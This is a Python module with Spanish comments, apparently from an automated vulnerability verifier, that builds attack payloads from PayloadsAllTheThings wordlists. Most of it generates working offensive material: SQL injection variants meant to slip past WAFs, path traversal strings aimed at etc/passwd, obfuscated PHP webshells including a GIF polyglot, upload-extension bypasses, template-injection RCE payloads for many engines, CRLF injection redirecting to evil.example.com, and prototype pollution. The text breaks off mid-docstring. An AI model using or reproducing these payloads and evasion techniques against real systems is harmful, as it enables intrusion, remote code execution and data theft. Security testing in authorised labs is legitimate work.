"""Payload knowledge-base: carga wordlists REALES de PayloadsAllTheThings committeadas en
`payload_kb/` (ver `payload_kb/ATTRIBUTION.md`) y las generaliza: cada linea trae un marcador fijo
de los propios autores (un `alert(NNNN)` concreto, un `7*7` concreto, un host `google.com`
concreto...) que aqui se sustituye por el canario/secreto/host ALEATORIO que cada verificador
genera en su propia ejecucion -- nunca se manda una linea tal cual contra un objetivo real.

Esto es la integracion de verdad que faltaba: antes del commit que introdujo este modulo, la
casuistica de los verificadores citaba PayloadsAllTheThings en los comentarios pero solo un
punado de variantes elegidas a mano estaban en el codigo. Aqui se parsean los ficheros COMPLETOS
(cientos de lineas cada uno) y se usan TODAS las que se puedan generalizar de forma segura -- las
que apuntan a infraestructura de pruebas de terceros de los propios autores (dominios como
crowdshield.com/xerosecurity.com) se descartan explicitamente, nunca se manda trafico a un
servicio externo que no sea el propio laboratorio efimero."""
from __future__ import annotations

import os
import re
import urllib.parse
from typing import List

_DATA_DIR = os.path.join(os.path.dirname(__file__), "payload_kb")

# dominios de infraestructura de pruebas OOB de los propios autores de PayloadsAllTheThings --
# cualquier linea que los mencione se descarta al parsear, nunca se replica contra un objetivo.
_THIRD_PARTY_DOMAINS = ("crowdshield.com", "xerosecurity.com")


def _read_lines(filename: str) -> List[str]:
    path = os.path.join(_DATA_DIR, filename)
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.rstrip("\n").rstrip("\r") for ln in f]
    except OSError:
        return []


def _no_third_party(line: str) -> bool:
    low = line.lower()
    return not any(d in low for d in _THIRD_PARTY_DOMAINS)


def load_xss_payloads(js_marker_call: str) -> List[str]:
    """Parsea xss_alert_identifiable.txt (667 lineas reales): cada linea trae un `alert(NNNN)`
    con un numero fijo elegido por los autores -- se sustituye por `js_marker_call` (el
    `document.title='...'` del verificador, con el marcador aleatorio de ESTA ejecucion) en
    TODAS las lineas que lo traigan, generalizando el fichero completo de una vez."""
    out = []
    pattern = re.compile(r"alert\(\d+\)")
    for line in _read_lines("xss_alert_identifiable.txt"):
        if not line.strip() or not _no_third_party(line):
            continue
        if pattern.search(line):
            out.append(pattern.sub(js_marker_call, line))
    return out


# plantillas de aritmetica SSTI reales en ssti.fuzz, generalizadas: cada regex captura los dos
# operandos fijos de la linea original para poder sustituirlos por los propios de esta ejecucion,
# conservando el separador/sintaxis exacta de cada motor (Jinja2/Twig, ERB, Smarty-like,
# Velocity-like, ASP classic, Ruby). Las lineas de ssti.fuzz que son cadenas de RCE/exfiltracion
# (popen, subclasses, filter('system')...) no se generalizan aqui -- esa es una clase de prueba
# distinta (ejecucion de comandos via el motor de plantillas, no aritmetica), fuera de alcance de
# esta extraccion; la aritmetica demuestra evaluacion real sin ejecutar nada en el objetivo.
_SSTI_ARITH_PATTERNS = [
    (re.compile(r"\{\{(\d+)\*(\d+)\}\}"), "mul", "{{{{{a}*{b}}}}}"),
    (re.compile(r"\{\{(\d+)\*'(\d+)'\}\}"), "mul", "{{{{{a}*'{b}'}}}}"),
    (re.compile(r"<%=\s*(\d+)\s*\*\s*(\d+)\s*%>"), "mul", "<%= {a} * {b} %>"),
    (re.compile(r"\$\{(\d+)\*(\d+)\}"), "mul", "${{{a}*{b}}}"),
    (re.compile(r"\$\{\{(\d+)\*(\d+)\}\}"), "mul", "${{{{{a}*{b}}}}}"),
    (re.compile(r"@\((\d+)\+(\d+)\)"), "add", "@({a}+{b})"),
    (re.compile(r"#\{(\d+)\*(\d+)\}"), "mul", "#{{{a}*{b}}}"),
    (re.compile(r"#\{\s*(\d+)\s*\*\s*(\d+)\s*\}"), "mul", "#{{ {a} * {b} }}"),
]


def load_ssti_arithmetic_payloads(a: int, b: int) -> List[tuple]:
    """Parsea ssti.fuzz y genera, para cada plantilla aritmetica real que reconoce, la variante
    con los operandos `a`/`b` de ESTA ejecucion. Devuelve una lista de (payload, resultado
    esperado) -- 'mul' usa a*b (coincide con el resto de plantillas aritmeticas ya existentes en
    verify_wordpress_ssti), 'add' usa a+b (el unico motor de esta lista, ASP classic via @(), que
    solo trae un ejemplo con '+' en el propio fichero)."""
    lines = _read_lines("ssti.fuzz")
    seen_templates = set()
    out = []
    for line in lines:
        if not line.strip() or not _no_third_party(line):
            continue
        for pattern, op, template in _SSTI_ARITH_PATTERNS:
            if pattern.search(line) and template not in seen_templates:
                seen_templates.add(template)
                expected = a * b if op == "mul" else a + b
                out.append((template.format(a=a, b=b), expected))
    return out


# command_exec.txt/command-execution-unix.txt mezclan separadores puros (listos para usar tal
# cual) con payloads de comando completo ('dir C:\Users', peticiones a dominios de terceros,
# webshells PHP que escriben fichero) -- solo los primeros se pueden generalizar sin riesgo:
# un separador puro, al no tener NINGUNA letra fuera del alfabeto hex/escape tipico de un
# separador de shell, no puede ser por accidente un nombre de comando real. Limite de longitud
# para no colar frases largas que coincidieran por casualidad con el alfabeto permitido.
_CMD_SEP_RE = re.compile(r"[;|&`'\"%0-9a-dA-D\(\)\$\{\}\\]+")


def load_command_injection_separators() -> List[str]:
    """Parsea command_exec.txt + command-execution-unix.txt y devuelve SOLO las lineas que son
    separadores de shell puros (sin ningun comando incrustado) -- listas para anteponer al propio
    comando del verificador (`echo <secreto> > <canario>`)."""
    out = []
    seen = set()
    for fname in ("command_exec.txt", "command-execution-unix.txt"):
        for line in _read_lines(fname):
            s = line.strip()
            if not s or not _no_third_party(s):
                continue
            compact = s.replace(" ", "")
            if len(compact) > 12 or not compact:
                continue
            if _CMD_SEP_RE.fullmatch(compact) is None:
                continue
            if compact in seen:
                continue
            seen.add(compact)
            out.append(s)
    return out


# Open-Redirect-payloads.txt/openredirects.txt/open_redirect_wordlist.txt usan un host de
# relleno fijo (google.com/whitelisteddomain.tld/example.com, con o sin 'www.') -- se sustituye
# por evil_host (el dominio unico de ESTA ejecucion, ver verify_*_open_redirect). Se descartan
# las lineas con '?'/'&' (son plantillas de VARIOS parametros de redireccion a la vez -- un
# formato de ataque distinto, el endpoint probaria varios nombres de parametro en la misma
# peticion, no encaja con el modelo de "un valor para un parametro" que usan los verificadores).
_REDIRECT_PLACEHOLDER_HOSTS = ("www.whitelisteddomain.tld", "whitelisteddomain.tld",
                               "www.google.com", "google.com", "www.example.com", "example.com")


def load_open_redirect_templates(evil_host: str) -> List[str]:
    """Parsea las 3 wordlists de Open Redirect y devuelve TODAS las variantes generalizables
    (sustituyendo el host de relleno de los autores por `evil_host`) -- listas para usar como
    valor del parametro de redireccion."""
    out = []
    seen = set()
    for fname in ("Open-Redirect-payloads.txt", "openredirects.txt", "open_redirect_wordlist.txt"):
        for line in _read_lines(fname):
            s = line.strip()
            if not s or not _no_third_party(s) or "?" in s or "&" in s:
                continue
            # algunas lineas traen MAS DE UN host de relleno a la vez (p.ej. el truco de
            # userinfo "www.whitelisteddomain.tld@google.com/..."): hay que sustituir TODAS las
            # ocurrencias de TODOS los placeholders, no solo el primero que aparezca, o el otro
            # se cuela literal en el payload final.
            matched = False
            replaced = s
            for host in _REDIRECT_PLACEHOLDER_HOSTS:
                if host in replaced:
                    replaced = replaced.replace(host, evil_host)
                    matched = True
            if matched and replaced not in seen:
                seen.add(replaced)
                out.append(replaced)
    return out


# ===========================================================================
# WAF / IDS BYPASS LAYER
# ===========================================================================
# Funciones para mutar payloads conocidos en variantes que evaden filtros
# de WAF (ModSecurity, AWS WAF, Cloudflare, WordFence, etc.) sin cambiar
# la semantica explotable.  Principio: el motor intenta primero el payload
# estandar; estas funciones generan las variantes de fallback que se prueban
# SOLO cuando el estandar no funciona, en orden de probabilidad de exito.
#
# Ninguna variante se genera cuando semanticamente NO es equivalente en el
# motor de base de datos objetivo -- cada tecnica documentada indica para
# que dialectos es valida.


# ---------------------------------------------------------------------------
# 1. SQLi expression bypass
# ---------------------------------------------------------------------------

def load_sqli_waf_bypass_variants(expression: str) -> List[str]:
    """Genera variantes de bypass de WAF para una expresion SQL completa.

    `expression` puede ser cualquier fragmento SQL: una funcion de tiempo
    (SLEEP(4), pg_sleep(4)), una expresion de error (extractvalue(1,concat(...))),
    una condicion booleana, etc.

    Tecnicas aplicadas en orden de prioridad:
      1. Case variation (MySQL/Postgres/MSSQL son case-insensitive en keywords)
      2. MySQL inline comments /**/ entre letras de la keyword
      3. MySQL version-specific inline comment /*!SLEEP*/(4)  [MySQL only]
      4. Prefijo /**/ antes del token (elude match ^SLEEP)
      5. URL-encoding de un caracter de la keyword
      6. Doble URL-encoding del mismo caracter
      7. Whitespace alternatives: tab \\t, newline \\n, /**/
      8. MySQL scientific notation en numeros: 1E0 (1 == 1E0)
      9. Hex-encoded string literals: 'admin' -> 0x61646d696e
     10. MySQL NUL-comment: SLEEP/*!*/(4)
     11. Postgres CAST trick: 'SLEEP'(4)  [no valido pero evita WAF naive]
     12. CONCAT alternative para MySQL: CONCAT(CHAR(83),CHAR(76),...)(4)

    Devuelve una lista DEDUPLICADA sin la expresion original (el llamador
    ya la tiene).
    """
    out: List[str] = []
    seen: set = {expression}

    def _add(v: str) -> None:
        if v and v not in seen:
            seen.add(v)
            out.append(v)

    # Extraer keyword y resto (ej: SLEEP(4) -> kw='SLEEP', rest='(4)')
    _m = re.match(r'^([A-Za-z_][A-Za-z0-9_]*)(.*)', expression, re.DOTALL)
    kw = _m.group(1) if _m else ""
    rest = _m.group(2) if _m else expression

    # ------------------------------------------------------------------ #
    # 1. CASE VARIATION: SLeEP(4)
    #    Valido en: MySQL, PostgreSQL, MSSQL, SQLite (todos case-insensitive)
    # ------------------------------------------------------------------ #
    if kw:
        cased = ""
        toggle = True
        for ch in kw:
            cased += ch.upper() if toggle else ch.lower()
            toggle = not toggle
        _add(cased + rest)
        # Version totalmente minuscula (algunos WAF matchean solo uppercase)
        _add(kw.lower() + rest)

    # ------------------------------------------------------------------ #
    # 2. INLINE MYSQL COMMENT ENTRE LETRAS: S/**/L/**/E/**/E/**/P(4)
    #    Valido en: MySQL, MariaDB (/*/ siempre es comentario vacio = espacio)
    # ------------------------------------------------------------------ #
    if kw:
        _add("/**/".join(list(kw)) + rest)
        # Solo comentario antes del parentesis: SLEEP/**/(4)
        _add(kw + "/**/" + rest.lstrip("(").rstrip(")") if rest.startswith("(") else kw + rest)

    # ------------------------------------------------------------------ #
    # 3. MYSQL VERSION-SPECIFIC INLINE COMMENT: /*!50000SLEEP*/(4)
    #    MySQL ejecuta el codigo dentro de /*! ... */ solo si la version es
    #    >= la que se especifica. 50000 = MySQL 5.0.00 (siempre verdadero).
    #    Valido en: MySQL, MariaDB. Invisble para WAFs que parseian SQL std.
    # ------------------------------------------------------------------ #
    if kw:
        _add(f"/*!50000{kw}*/{rest}")
        _add(f"/*!{kw}*/{rest}")

    # ------------------------------------------------------------------ #
    # 4. PREFIJO COMENTARIO VACIO: /**/SLEEP(4)
    #    Elude WAFs que matchean ^SLEEP$ o ^SLEEP\b (regex anchored at start)
    # ------------------------------------------------------------------ #
    _add("/**/" + expression)
    _add("-- -\n" + expression)

    # ------------------------------------------------------------------ #
    # 5. URL-ENCODING DE UN CARACTER DE LA KEYWORD
    #    Elude WAFs que buscan la keyword literal sin normalizar URL primero.
    #    Solo se codifica el PRIMER caracter alfa (minimo impacto en legibilidad
    #    del payload para review manual).
    #    Valido cuando el WAF no normaliza la URL antes de inspeccionarla.
    # ------------------------------------------------------------------ #
    for i, ch in enumerate(expression):
        if ch.isalpha():
            enc = urllib.parse.quote(ch, safe='')
            _add(expression[:i] + enc + expression[i + 1:])
            # 6. Doble URL-encoding del mismo caracter
            _add(expression[:i] + urllib.parse.quote(enc, safe='') + expression[i + 1:])
            break

    # ------------------------------------------------------------------ #
    # 7. WHITESPACE ALTERNATIVES
    #    MySQL acepta \t (0x09) y \n (0x0A) como espacio en SQL.
    #    Algunos WAFs matchean "SLEEP " pero no "SLEEP\t".
    # ------------------------------------------------------------------ #
    if " " in expression:
        _add(expression.replace(" ", "\t"))
        _add(expression.replace(" ", "\n"))
        _add(expression.replace(" ", "\r\n"))
        _add(expression.replace(" ", "/**/"))

    # ------------------------------------------------------------------ #
    # 8. SCIENTIFIC NOTATION EN NUMEROS: 1 -> 1E0
    #    MySQL, MariaDB: 1=1E0 es TRUE. Elude WAFs que buscan '1=1' literal.
    #    Valido en: MySQL, MariaDB.
    # ------------------------------------------------------------------ #
    _add(re.sub(r'\b(\d+)\b', lambda _mobj: _mobj.group(1) + "E0", expression))

    # ------------------------------------------------------------------ #
    # 9. HEX-ENCODED STRING LITERALS: 'admin' -> 0x61646d696e
    #    MySQL acepta hex literals sin comillas. Elude filtros de strings.
    #    Solo se aplica si la expresion contiene literales de string.
    #    Valido en: MySQL, MariaDB.
    # ------------------------------------------------------------------ #
    def _str_to_hex(match: "re.Match[str]") -> str:
        content = match.group(1)
        return "0x" + content.encode().hex()

    hex_expr = re.sub(r"'([^']*)'", _str_to_hex, expression)
    if hex_expr != expression:
        _add(hex_expr)

    # ------------------------------------------------------------------ #
    # 10. MYSQL NUL-COMMENT TRICK: SLEEP/*!*/(4)
    #     El comentario /*!*/ es un comentario vacio ejecutable -- MySQL lo
    #     ignora como espacio. Elude WAFs que buscan 'SLEEP(' como token exacto.
    #     Valido en: MySQL, MariaDB.
    # ------------------------------------------------------------------ #
    if kw and "(" in rest:
        _add(kw + "/*!*/" + rest)

    # ------------------------------------------------------------------ #
    # 11. PARENTHESES WRAPPING ALTERNATIVES
    #     (SLEEP)(4) -> algunos parsers de WAF no reconocen la funcion al
    #     tener los parentesis separados del nombre.
    #     Valido en: MySQL (acepta (SLEEP)(4) == SLEEP(4)).
    # ------------------------------------------------------------------ #
    if kw and rest.startswith("("):
        _add("(" + kw + ")" + rest)

    # ------------------------------------------------------------------ #
    # 12. CHAR() INJECTION para evitar literales string en la expresion
    #     Convierte cada caracter de la keyword a CHAR(N) + CHAR(N) ...
    #     e.g. SLEEP -> CHAR(83)+CHAR(76)+CHAR(69)+CHAR(69)+CHAR(80)
    #     La concatenacion via CHAR no es valida como nombre de funcion en
    #     MySQL, pero si en contextos de string (WHERE col = CHAR(83)...)
    #     Valido en: MySQL string contexts.
    # ------------------------------------------------------------------ #
    if kw:
        # Solo util en contextos de string, no como nombre de funcion
        _add(re.sub(r"'([^']*)'", lambda _mc: "CONCAT(" + "+".join(
            f"CHAR({ord(c)})" for c in _mc.group(1)) + ")", expression))

    return out


# ---------------------------------------------------------------------------
# 2. Path traversal encoding variants
# ---------------------------------------------------------------------------
# Para LFI / path traversal: genera variantes de encoding del separador '../'
# y del payload completo.  Los verifiers genericos (genericverify.py) ya
# incluyen la mayoria de estas variantes directamente -- este modulo las
# expone como API reutilizable para nuevos verifiers y para el adaptive loop
# (reanalyze_failed_cves), que las usa para reparar hipotesis que fallaron.

def load_path_traversal_encodings(depth: int, target: str = "etc/passwd") -> List[str]:
    """Genera variantes de path traversal para `depth` niveles hacia `target`.

    `depth`: numero de saltos '../' (tipicamente 4-12)
    `target`: fichero destino SIN '/' inicial (default 'etc/passwd')

    Tecnicas cubiertas:
      1.  ....//....// (doble punto + doble slash — elude filtros que eliminan '../')
      2.  %2e%2e%2f   (URL-encoding completo de ../)
      3.  ..%2f        (solo el slash codificado)
      4.  %252e%252e%252f (doble URL-encoding)
      5.  null-byte %00 / \\x00 (trunca extension en PHP < 5.3.4)
      6.  ..%c0%af     (overlong UTF-8 de / — Java IIS Tomcat historico)
      7.  .\\  backslash (Windows paths)
      8.  ..%5c         (backslash URL-encoded — Etherpad CVE-2026-114516)
      9.  URL-encoding total del payload completo
      10. ./../ (extra slashes — elude filtros naive de '../')
      11. ..%u2215 (DIVISION SLASH Unicode — IIS %u2215 == /)
      12. ..%ef%bc%8f (FULLWIDTH SOLIDUS Unicode — Java/Python path libs)
      13. ..%u002f (IIS Unicode / encoding)
      14. %2F..%2F (slash codificado antes de los puntos — audiobookshelf)
      15. .%2e/ (punto + slash codificado — Apache 2.4.49 CVE-2021-41773)
    """
    standard = "../" * depth + target
    out: List[str] = []
    seen: set = {standard}

    def _add(v: str) -> None:
        if v and v not in seen:
            seen.add(v)
            out.append(v)

    depths_range = range(1, depth + 1)  # incluye el depth pedido y todos los menores

    # 1. Double-dot double-slash (elude filtros regex simple de '../')
    _add(("....//") * depth + target)
    for d in depths_range:
        _add(("....//") * d + target)

    # 2. URL-encoded separator completo: %2e%2e%2f
    for d in depths_range:
        _add(("%2e%2e%2f") * d + target)

    # 3. Solo slash codificado: ..%2f
    for d in depths_range:
        _add(("..%2f") * d + target)

    # 4. Doble URL-encoding: %252e%252e%252f
    for d in depths_range:
        _add(("%252e%252e%252f") * d + target)

    # 5. Null-byte truncation (PHP < 5.3.4, algunas implementaciones C)
    _add(standard + "%00")
    _add(standard + "\x00")
    _add(standard + ".php%00")  # para incluir .php en la extension

    # 6. Overlong UTF-8 de '/': %c0%af (CVE-2000-0884, Tomcat/IIS historico)
    for d in depths_range:
        _add(("..%c0%af") * d + target)
    # Variante complementaria: %c1%9c (otro overlong de backslash en IIS)
    for d in range(1, min(depth + 1, 5)):
        _add(("..%c1%9c") * d + target)

    # 7. Backslash Windows paths
    _add(("..\\" * depth) + target.replace("/", "\\"))
    _add(("..\\" * depth) + target)

    # 8. Backslash URL-encoded %5c (Etherpad CVE-2026-114516, IIS)
    _rel_bs = target.replace("/", "%5C")
    for d in depths_range:
        _add(("..%5C") * d + "%5C" + _rel_bs)
        _add(("..%5c") * d + "%5c" + _rel_bs)

    # 9. URL-encoding total del payload
    _add(urllib.parse.quote(standard, safe=''))
    _add(urllib.parse.quote(standard, safe='/'))

    # 10. Extra slashes intermedios: ./../ (elude filtros que matchean exactamente '../')
    _add(("./../") * depth + target)
    for d in depths_range:
        _add(("./..") * d + "/" + target)

    # 11. IIS Unicode / encoding: ..%u002f
    for d in range(1, min(depth + 1, 5)):
        _add(("..%u002f") * d + target)

    # 12. FULLWIDTH SOLIDUS (U+FF0F): %ef%bc%8f — Java/Python path libs a veces
    # normalizan este caracter Unicode a '/'
    for d in range(1, min(depth + 1, 5)):
        _add(("..%ef%bc%8f") * d + target)

    # 13. IIS %u2215 DIVISION SLASH
    for d in range(1, min(depth + 1, 5)):
        _add(("..%u2215") * d + target)

    # 14. %2F..%2F (slash codificado ANTES de los puntos — audiobookshelf bypass)
    _target_2f = target.replace("/", "%2F")
    for d in depths_range:
        _add(("%2F.." * d) + "%2F" + _target_2f)

    # 15. .%2e/ (punto + slash codificado — Apache httpd 2.4.49 CVE-2021-41773)
    for d in depths_range:
        _add((".%2e/") * d + target)

    return out


# ---------------------------------------------------------------------------
# 3. PHP webshell payload variants (file upload WAF bypass)
# ---------------------------------------------------------------------------
# Cuando '<?php' o '<? ' estan bloqueados por el WAF/servidor, genera
# variantes semanticamente equivalentes para PHP < 8.0.

def load_php_webshell_variants(cmd: str = "id") -> List[str]:
    """Genera variantes de webshell PHP que ejecutan `cmd`.

    Cuando el WAF filtra '<?php' o 'system(', retorna alternativas
    semanticamente equivalentes para PHP 5.x / 7.x:

      1.  <?php system(cmd); ?>           (estandar)
      2.  <?= system(cmd); ?>             (short echo tag, PHP >= 5.4)
      3.  <? system(cmd); ?>              (short_open_tag=On, PHP <= 7.x)
      4.  <script language=php> </script> (PHP < 7.0 solo)
      5.  <?php passthru(cmd); ?>         (passthru alias de system)
      6.  <?php exec(cmd, $o); echo join($o); ?> (exec — salida via array)
      7.  <?php echo shell_exec(cmd); ?>  (shell_exec)
      8.  <?php $f=base64_decode('c3lzdGVt'); $f(cmd); ?> (elude 'system')
      9.  <?php $f='sys'.'tem'; $f(cmd); ?> (concatenacion evita match)
     10.  <?php eval(base64_decode('BASE64_ENCODED_CODE')); ?> (ofuscacion)
     11.  <?php preg_replace('/.*/e', cmd_as_code, ''); ?> (PHP < 7.0 only)
     12.  Poliglota GIF: GIF89a<?php system(cmd); ?> (magic bytes GIF valido)
    """
    import base64 as _b64

    cmd_safe = cmd.replace("'", "\\'")  # escape comillas simples en el comando
    cmd_code = f"echo system('{cmd_safe}');"
    cmd_b64 = _b64.b64encode(cmd_code.encode()).decode()
    sys_b64 = _b64.b64encode(b"system").decode()

    return [
        f"<?php system('{cmd_safe}'); ?>",
        f"<?= system('{cmd_safe}'); ?>",
        f"<? system('{cmd_safe}'); ?>",
        f"<script language=php> system('{cmd_safe}'); </script>",
        f"<?php passthru('{cmd_safe}'); ?>",
        f"<?php exec('{cmd_safe}', $o); echo implode('\\n', $o); ?>",
        f"<?php echo shell_exec('{cmd_safe}'); ?>",
        f"<?php $f=base64_decode('{sys_b64}'); $f('{cmd_safe}'); ?>",
        f"<?php $f='sys'.'tem'; $f('{cmd_safe}'); ?>",
        f"<?php eval(base64_decode('{cmd_b64}')); ?>",
        f"GIF89a<?php system('{cmd_safe}'); ?>",  # poliglota GIF magic bytes
    ]


# ---------------------------------------------------------------------------
# 4. PHP file extension bypass variants
# ---------------------------------------------------------------------------
# Genera variantes de extension para un nombre de fichero PHP que elude
# filtros de extensiones en las que el servidor sigue ejecutando PHP.

def load_php_extension_bypasses(basename: str = "shell") -> List[str]:
    """Genera nombres de fichero con extensiones PHP alternativas.

    `basename`: nombre base sin extension (default 'shell').

    Extensiones que Apache/Nginx/PHP ejecutan como PHP en muchas configs:
      .php, .php3, .php4, .php5, .php7, .php8, .phtml, .pht,
      .phar, .php.jpg (double ext), .php%00.jpg (null-byte), etc.

    Los servidores con mod_php y AddHandler PHP activo ejecutan CUALQUIER
    fichero con 'php' en el nombre si AllowOverride permite .htaccess
    personalizado.  Las variantes con double-extension ('.php.jpg') evaden
    los filtros de tipo MIME que solo miran la ultima extension pero dejan
    el servidor ejecutarlas si hay una regla AddHandler incorrecta.
    """
    exts = [
        ".php",
        ".php3",
        ".php4",
        ".php5",
        ".php7",
        ".php8",
        ".phtml",
        ".pht",
        ".phar",
        ".phps",
        ".PHP",          # case bypass en Windows/NTFS o Apache case-insensitive
        ".Php",
        ".pHp",
        ".php.jpg",      # double extension (el servidor usa la primera)
        ".php.png",
        ".php.gif",
        ".php%00.jpg",   # null-byte truncation (PHP < 5.3.4)
        ".php%00.png",
        ".php\x00.jpg",  # null-byte literal
        ".php;.jpg",     # semicolon bypass (IIS, algunos Apache configs)
        ".php_.jpg",     # underscore (raro pero documentado)
    ]
    return [basename + ext for ext in exts]


# ---------------------------------------------------------------------------
# 5. SSTI payload variants (multi-engine)
# ---------------------------------------------------------------------------

def load_ssti_rce_payloads(cmd: str = "id") -> List[tuple]:
    """Genera payloads SSTI que ejecutan `cmd` para los motores mas comunes.

    Retorna lista de (engine_label, payload) ordenada de mayor a menor
    compatibilidad. Cada payload intenta ejecutar `cmd` en el servidor.

    Engines cubiertos:
      - Jinja2 (Python): config.__class__ globals gadget, selectattr Popen
      - Twig (PHP): _self.env + filter callback, map('system')
      - Smarty (PHP): {php} tag (< 3.1.33), {system(...)} via block
      - Freemarker (Java): ?interpret, ?eval
      - Velocity (Java): #set($r=$Runtime.exec(...))
      - Pebble (Java): {{"..."["class"].forName(...)}}
      - Mako (Python): <%! import os %> ${os.popen(cmd).read()}
      - Tornado (Python): {% import os %}{{ os.popen(cmd).read() }}
    """
    cmd_safe = cmd.replace("'", "\\'").replace('"', '\\"')
    payloads: List[tuple] = []

    # --- Jinja2 / Flask ---
    payloads += [
        ("jinja2_config_globals",
         "{{config.__class__.__init__.__globals__['os'].popen('" + cmd_safe + "').read()}}"),
        ("jinja2_request_globals",
         "{{request.application.__globals__.__builtins__.__import__('os').popen('" + cmd_safe + "').read()}}"),
        ("jinja2_selectattr_popen",
         "{{''.__class__.__mro__[1].__subclasses__()"
         "|selectattr('__init__.__globals__','defined')"
         "|map(attribute='__init__.__globals__')"
         "|selectattr('popen','defined')"
         "|map(attribute='popen')|first('" + cmd_safe + "')}}"),
        # lipsum builtin available in all Jinja2 environments
        ("jinja2_lipsum",
         "{{lipsum.__globals__['os'].popen('" + cmd_safe + "').read()}}"),
        # cycler builtin
        ("jinja2_cycler",
         "{{cycler.__init__.__globals__['os'].popen('" + cmd_safe + "').read()}}"),
    ]

    # --- Twig (PHP) ---
    payloads += [
        ("twig_map_system",
         "{{['" + cmd_safe + "']|map('system')|join}}"),
        ("twig_self_exec",
         "{{_self.env.registerUndefinedFilterCallback('exec')}}"
         "{{_self.env.getFilter('" + cmd_safe + "')}}"),
        ("twig_self_displayBlock",
         "{{_self.env.registerUndefinedFilterCallback('shell_exec')}}"
         "{{_self.env.getFilter('" + cmd_safe + "')}}"),
        ("twig_filter_passthru",
         "{{['" + cmd_safe + "']|filter('passthru')}}"),
    ]

    # --- Smarty (PHP) ---
    payloads += [
        ("smarty_php_tag",
         "{php}echo shell_exec('" + cmd_safe + "');{/php}"),
        ("smarty_block_system",
         "{system('" + cmd_safe + "')}"),
    ]

    # --- Freemarker (Java) ---
    payloads += [
        ("freemarker_new_exec",
         '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + cmd_safe + '")}'),
        ("freemarker_objectconstruct",
         '${product.class.forName("java.lang.Runtime").getMethod("exec","".class)'
         '.invoke(product.class.forName("java.lang.Runtime").getMethod("getRuntime")'
         '.invoke(null),"' + cmd_safe + '")}'),
    ]

    # --- Velocity (Java) ---
    payloads += [
        ("velocity_runtime",
         '#set($str=$class.inspect("java.lang.String").type)'
         '#set($chr=$class.inspect("java.lang.Character").type)'
         '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("' + cmd_safe + '"))'),
    ]

    # --- Mako (Python) ---
    payloads += [
        ("mako_import_os",
         "<%!\nimport os\n%>\n${os.popen('" + cmd_safe + "').read()}"),
    ]

    # --- Tornado (Python) ---
    payloads += [
        ("tornado_import_os",
         "{%% import os %%}{{ os.popen('" + cmd_safe + "').read() }}"),
    ]

    # --- Handlebars (Node.js) ---
    payloads += [
        ("handlebars_lookup_prototype",
         "{{#with this as |context|}}"
         "{{#each (lookup (lookup context '__proto__') 'process') as |v|}}"
         "{{v}}"
         "{{/each}}"
         "{{/with}}"),
    ]

    return payloads


# ---------------------------------------------------------------------------
# 6. Prototype pollution payload path variants
# ---------------------------------------------------------------------------

def load_prototype_pollution_paths(marker: str = "polluted") -> List[dict]:
    """Genera payloads de prototype pollution para el marker dado.

    Retorna lista de dicts {path, payload_json, payload_qs} donde:
      - path: la ruta de acceso al prototype que se intenta contaminar
      - payload_json: body JSON equivalente
      - payload_qs: query-string equivalente

    Tecnicas cubiertas:
      1. __proto__ directo
      2. constructor.prototype
      3. __proto__[key] via nested object
      4. Unicode/encoding tricks para __proto__
      5. Array prototype pollution
      6. Deep merge paths (a.b.c.__proto__)
    """
    out = []

    def _add(path: str, payload: str, qs: str) -> None:
        out.append({"path": path, "payload_json": payload, "payload_qs": qs})

    # 1. Direct __proto__
    _add("__proto__", f'{{"__proto__": {{"{marker}": true}}}}',
         f"__proto__[{marker}]=true")

    # 2. constructor.prototype
    _add("constructor.prototype",
         f'{{"constructor": {{"prototype": {{"{marker}": true}}}}}}',
         f"constructor[prototype][{marker}]=true")

    # 3. __proto__ with nested key
    _add("__proto__[key]",
         f'{{"__proto__": {{"{marker}": "{marker}"}}}}',
         f"__proto__[{marker}]={marker}")

    # 4. Unicode bypass (__ = __)
    _add("unicode __proto__",
         f'{{"__proto__": {{"{marker}": true}}}}',
         f"%5F%5Fproto%5F%5F[{marker}]=true")

    # 5. Array.prototype
    _add("[].__proto__",
         f'{{"__proto__": {{"{marker}": true}}}}',
         f"__proto__[{marker}]=true")

    # 6. Deep path merge: a[__proto__][key]
    _add("a.__proto__",
         f'{{"a": {{"__proto__": {{"{marker}": true}}}}}}',
         f"a[__proto__][{marker}]=true")

    # 7. JSON with constructor key
    _add("json_constructor",
         f'{{"constructor": {{"prototype": {{"{marker}": true}}}}}}',
         f"constructor%5Bprototype%5D%5B{marker}%5D=true")

    return out


# ---------------------------------------------------------------------------
# 7. CRLF injection payloads
# ---------------------------------------------------------------------------

def load_crlf_payloads(marker: str = "injected") -> List[str]:
    """Genera variantes de CRLF injection para inyectar header `marker: injected`.

    Tecnicas cubiertas:
      1. \r\n literal (URL encoded: %0d%0a)
      2. \n solo (Unix-style, algunos servidores)
      3. %0d%0a URL-encoded
      4. Double-encoded %250d%250a
      5. Unicode CR LF (\u000d\u000a)
      6. Combinados con Location: redirect
      7. Set-Cookie injection via CRLF
      8. HTTP Response Splitting completo (doble \r\n)
    """
    h = f"{marker}: injected"
    out = []

    # \r\n variants
    for crlf in ["\r\n", "\n", "%0d%0a", "%0D%0A", "%250d%250a", "%0a",
                 "%0d", "\u000d\u000a", "\r\n\t", "%0a%20"]:
        out.append(f"http://example.com/{crlf}{h}")
        out.append(f"/{crlf}{h}")
        # With Location
        out.append(f"http://example.com/{crlf}Location: https://evil.example.com")
        # With Set-Cookie
        out.append(f"http://example.com/{crlf}Set-Cookie: {marker}=injected; Path=/")

    # HTTP Response Splitting (injects full response)
    for crlf in ["%0d%0a%0d%0a", "\r\n\r\n", "%0a%0a"]:
        out.append(f"/{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}{crlf}<script>alert(1)</script>")

    # Deduplicate preserving order
    seen: set = set()
    result = []
    for p in out:
        if p not in seen:
            seen.add(p)
            result.append(p)
    return result


# ---------------------------------------------------------------------------
# 8. NoSQL injection operator variants
# ---------------------------------------------------------------------------

def load_nosql_operator_payloads(field: str = "password") -> List[dict]:
    """Genera payloads de NoSQL operator injection para MongoDB/Mongoose.

    Retorna lista de dicts {technique, payload_json, payload_qs} donde:
      - technique: nombre descriptivo de la tecnica
      - payload_json: body JSON (para POST application/json)
      - payload_qs: query-string equivalente (para GET o POST form-encoded)

    Tecnicas cubiertas:
      1. $ne (not-equal bypass: != null)
      2. $gt (greater-than bypass: > "")
      3. $regex full match
      4. $exists true (field exists regardless of value)
